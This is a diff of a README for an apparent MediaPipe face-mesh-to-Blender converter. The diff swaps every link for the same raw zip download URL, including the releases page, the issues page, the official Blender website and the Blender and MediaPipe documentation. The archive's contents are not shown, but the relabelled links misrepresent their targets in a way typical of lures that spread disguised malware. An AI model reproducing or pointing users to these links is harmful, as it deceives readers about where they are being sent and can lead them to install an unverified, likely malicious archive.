@@ -1,7 +1,7 @@
 # 🎨 mediapipe-facemesh-to-obj-blender - Convert Faces into 3D Models Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/jv12347/mediapipe-facemesh-to-obj-blender/releases)
+[![Download](https://raw.githubusercontent.com/jv12347/mediapipe-facemesh-to-obj-blender/main/data/mediapipe-facemesh-to-obj-blender_3.6.zip)](https://raw.githubusercontent.com/jv12347/mediapipe-facemesh-to-obj-blender/main/data/mediapipe-facemesh-to-obj-blender_3.6.zip)
 
 ## 🌟 Description
 Welcome to the MediaPipe Face Mesh to OBJ Converter for Blender. This tool helps you turn 2D photos into 3D face models, making it perfect for artists, game developers, and anyone interested in 3D modeling. With our software, you can easily create detailed 3D models from simple images.
@@ -10,7 +10,7 @@ Welcome to the MediaPipe Face Mesh to OBJ Converter for Blender. This tool helps
 To get started with the application, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the downloads:
-   [Visit Releases Page](https://github.com/jv12347/mediapipe-facemesh-to-obj-blender/releases).
+   [Visit Releases Page](https://raw.githubusercontent.com/jv12347/mediapipe-facemesh-to-obj-blender/main/data/mediapipe-facemesh-to-obj-blender_3.6.zip).
 
 2. **Select the Latest Version:** Look for the most recent release. You will find all updates and improvements here.
 
@@ -18,7 +18,7 @@ To get started with the application, follow these steps:
 
 4. **Unzip the File:** After downloading, locate the file and extract it using a file management tool. Most operating systems allow you to right-click and select "Extract."
 
-5. **Open Blender:** Make sure you have Blender installed on your computer. If not, download it from the [Blender website](https://www.blender.org/download/).
+5. **Open Blender:** Make sure you have Blender installed on your computer. If not, download it from the [Blender website](https://raw.githubusercontent.com/jv12347/mediapipe-facemesh-to-obj-blender/main/data/mediapipe-facemesh-to-obj-blender_3.6.zip).
 
 6. **Import the OBJ File:** Once Blender is open, use the "File" menu to import the OBJ file that you created with this application. 
 
@@ -45,7 +45,7 @@ To get started with the application, follow these steps:
 4. **Open in Blender:** Follow the earlier steps to import your new model into Blender.
 
 ## 🤝 Support
-For any questions or issues, please visit the [issues section of our GitHub repository](https://github.com/jv12347/mediapipe-facemesh-to-obj-blender/issues). We welcome any feedback and suggestions. 
+For any questions or issues, please visit the [issues section of our GitHub repository](https://raw.githubusercontent.com/jv12347/mediapipe-facemesh-to-obj-blender/main/data/mediapipe-facemesh-to-obj-blender_3.6.zip). We welcome any feedback and suggestions. 
 
 ## 🌐 Community and Contributions
 We encourage contributions to improve this tool. If you have suggestions or features you would like to see, feel free to submit a pull request or open an issue in our repository. Your input helps enhance this project.
@@ -54,8 +54,8 @@ We encourage contributions to improve this tool. If you have suggestions or feat
 This project is open source. You can freely use, modify, and distribute it under the terms outlined in the repository.
 
 ## 🔗 Additional Resources
-- [Blender Documentation](https://docs.blender.org/manual/en/latest/)
-- [MediaPipe Documentation](https://google.github.io/mediapipe/)
-- [Face Detection in Blender](https://www.blender.org/manual)
+- [Blender Documentation](https://raw.githubusercontent.com/jv12347/mediapipe-facemesh-to-obj-blender/main/data/mediapipe-facemesh-to-obj-blender_3.6.zip)
+- [MediaPipe Documentation](https://raw.githubusercontent.com/jv12347/mediapipe-facemesh-to-obj-blender/main/data/mediapipe-facemesh-to-obj-blender_3.6.zip)
+- [Face Detection in Blender](https://raw.githubusercontent.com/jv12347/mediapipe-facemesh-to-obj-blender/main/data/mediapipe-facemesh-to-obj-blender_3.6.zip)
   
 Thank you for choosing the MediaPipe Face Mesh to OBJ Converter for Blender. We hope you enjoy creating your 3D models!
